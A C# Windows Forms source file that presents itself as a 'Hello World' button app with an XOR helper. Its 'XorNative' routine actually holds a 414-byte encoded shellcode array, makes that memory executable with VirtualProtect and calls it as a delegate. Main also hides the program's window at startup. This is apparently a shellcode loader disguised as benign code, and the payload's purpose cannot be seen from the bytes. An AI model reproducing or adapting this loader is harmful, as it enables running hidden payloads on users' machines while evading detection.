using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using  System.Diagnostics;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System;
using System.Runtime.InteropServices;
using System.Text;


namespace FormWithButton
{

    public class ExecuteShellCode
    {
        #region "Win32 API"
        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
            uint flNewProtect, out uint lpflOldProtect);
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        #endregion

        public ExecuteShellCode()
        {
            Console.WriteLine("Xor Native Output: {0}", XorNative("Code", "1337"));
            Console.WriteLine("Xor Normal Output: {0}", XorNormal("Code", "1337"));
            Console.WriteLine(XorNative("Code", "1337") == XorNormal("Code", "1337"));
            Console.ReadLine();
        }

        static string Xor(string input, string key)
        {
            char[] result = input.ToCharArray();
            for (int i = 0; i < result.Length; i++)
                result[i] = (char)(result[i] ^ key[i]);

            return new string(result);
        }

        private static string XorNormal(string input, string key)
        {
            char[] result = input.ToCharArray();
            for (int i = 0; i < result.Length; i++)
                result[i] = (char)(result[i] ^ key[i]);

            return new string(result);
        }

        private delegate void DelXorNative(char[] input, char[] key, int length, out IntPtr result);

        private static string XorNative(string input, string key)
        {
            byte[] myShellcode = new byte[414]
            {
                0xda,0xc8,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xbe,0x6b,0xa6,0x52,0x20,0xb1,
                0x61,0x83,0xc2,0x04,0x31,0x72,0x16,0x03,0x72,0x16,0xe2,0x9e,0x7f,0x91,0xf9,
                0x14,0xa4,0xe2,0xa5,0x69,0x4d,0x56,0x9b,0x07,0xbd,0xae,0xaa,0x7c,0xf3,0x5f,
                0xda,0x01,0x34,0x9b,0xe7,0x83,0xf4,0x87,0x84,0x0e,0xba,0xb2,0xb2,0x01,0x7e,
                0x65,0xf9,0x1b,0x5b,0xc8,0xfa,0xd4,0xb1,0xef,0x29,0x34,0xf3,0xec,0x7f,0x02,
                0x47,0x12,0x8a,0xef,0xe0,0x85,0x67,0x11,0x13,0x1a,0x3e,0x52,0xd3,0x42,0x36,
                0xbd,0x16,0xf4,0xa7,0x90,0xe2,0x9b,0xb2,0xab,0x57,0x6f,0xc8,0xd5,0xa2,0xd9,
                0xa7,0xe9,0xab,0xfc,0xc0,0xf8,0xe5,0x2a,0x29,0x3a,0x1d,0x9c,0xad,0x30,0x40,
                0x1c,0x86,0xa3,0xbb,0x5d,0x74,0xba,0x69,0xe7,0x5c,0xe2,0x1c,0x56,0x7c,0x25,
                0x8b,0x22,0x42,0xf1,0xe1,0x3c,0x34,0xfb,0xc3,0x41,0xb8,0x18,0x1a,0xbd,0x5b,
                0xdb,0xae,0x41,0x1e,0xf6,0x01,0x43,0x6f,0x70,0x86,0x90,0xea,0xd0,0x02,0xe9,
                0x04,0xa0,0xbf,0xee,0x7a,0x6f,0x31,0x0b,0x4b,0x8a,0x3c,0x2a,0x22,0x21,0x59,
                0x99,0x81,0x61,0x03,0x5b,0x0c,0xe2,0x80,0x6a,0xea,0xf2,0xde,0x4e,0x02,0x53,
                0x57,0xbe,0xca,0x3a,0xd2,0xc7,0x19,0x9c,0xe9,0x85,0x6d,0x69,0xa6,0x13,0x30,
                0x60,0x95,0x0d,0x2d,0x67,0x46,0xa0,0x4e,0xe2,0x7c,0x04,0x72,0xd9,0x33,0xe1,
                0x9d,0xd6,0xaf,0xee,0xeb,0x01,0x50,0xb6,0x8d,0xc5,0x51,0x05,0x87,0x3f,0x06,
                0xcf,0x74,0xf7,0x6c,0x5a,0xfb,0x90,0x6a,0x25,0x3a,0x1d,0x74,0x7a,0xc4,0x58,
                0x5f,0x51,0x86,0xbb,0xb1,0xff,0x1e,0x14,0xa8,0xff,0x17,0x03,0x40,0x88,0x61,
                0x20,0xf8,0x68,0x7b,0x53,0x89,0xfe,0x98,0xbc,0x10,0xfa,0x5d,0x91,0xa9,0xe6,
                0xb3,0xde,0x36,0x04,0x75,0x4a,0x05,0xb5,0x2b,0xe7,0xfb,0x22,0x84,0x95,0xd4,
                0xfd,0xa7,0x42,0x33,0xd5,0x08,0xe0,0x77,0x91,0xb7,0x21,0x35,0x5e,0xed,0x85,
                0x49,0x1f,0x41,0x21,0x9a,0x9c,0x67,0x1d,0x17,0x2d,0x43,0x53,0xca,0x83,0x01,
                0x57,0x69,0x17,0x33,0x03,0x04,0xf0,0x64,0x3f,0xeb,0x39,0x96,0x54,0x28,0x42,
                0xd6,0x8c,0x77,0x0b,0x81,0x06,0x2b,0xda,0x66,0xa8,0xaa,0x7f,0xdb,0x11,0xb9,
                0x2e,0x46,0x29,0xb7,0xe3,0x6a,0x86,0xeb,0x5d,0xa4,0x9a,0x76,0xf2,0xaa,0x64,
                0x89,0xa5,0x8c,0x4f,0x22,0x7a,0xa5,0xf7,0x79,0xbb,0x6d,0x0b,0x46,0x65,0xf7,
                0xdb,0x52,0x83,0xf0,0xec,0xa6,0xfb,0xe1,0x09,0x1a,0x53,0x92,0xab,0xe7,0x5b,
                0xb3,0x67,0x0c,0x75,0x35,0x3d,0x3e,0xf4,0xda

            };

            IntPtr myShellcodePtr = IntPtr.Zero;
            string resultStr = string.Empty;

            try
            {
                GCHandle pinnedArray = GCHandle.Alloc(myShellcode, GCHandleType.Pinned);
                // get handle for shellcode

                IntPtr pointer = pinnedArray.AddrOfPinnedObject(); // get address

                DelXorNative myxorIt = (DelXorNative)Marshal.GetDelegateForFunctionPointer(pointer,
                    typeof(DelXorNative)); // convert function-pointer to delegate

                uint flOldProtect;

                VirtualProtect(pointer, (UIntPtr)myShellcode.Length, PAGE_EXECUTE_READWRITE,
                    out flOldProtect); // make shellcode executable

                IntPtr byteOut = IntPtr.Zero;

                myxorIt(input.ToCharArray(), key.ToCharArray(), input.Length, out byteOut);
                // execute shellcode

                VirtualProtect(pointer, (UIntPtr)myShellcode.Length, flOldProtect,
                    out flOldProtect); // restore old flag

                pinnedArray.Free();

                byte[] result = new byte[input.Length];
                Marshal.Copy(byteOut, result, 0, input.Length);
                // here is our returned byte array in result

                resultStr = Encoding.UTF8.GetString(result);
            }
            finally // cleanup
            {
                if (myShellcodePtr != IntPtr.Zero)
                {
                    Marshal.FreeCoTaskMem(myShellcodePtr);
                    myShellcodePtr = IntPtr.Zero;
                }
            }
            return resultStr;
        }
    }
    
    public class Form1 : Form
    {
        public Button button1;

    	[DllImport("user32.dll")]
    	static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    	const int SW_HIDE = 0;
    	const int SW_SHOW = 5;

        public Form1()
        {
            button1 = new Button();
            button1.Size = new Size(40, 40);
            button1.Location = new Point(30, 30);
            button1.Text = "Click me";
            this.Controls.Add(button1);
            button1.Click += new EventHandler(button1_Click);
        }
        private void button1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Hello World");
        }

        [STAThread]
        static void Main()
        {

            Application.SetCompatibleTextRenderingDefault(false);	    
    	    IntPtr h = Process.GetCurrentProcess().MainWindowHandle;
    	    ShowWindow(h, 0);
    	    Application.EnableVisualStyles();

		    new Form1();
            Application.Run();
                
        }





    }
}
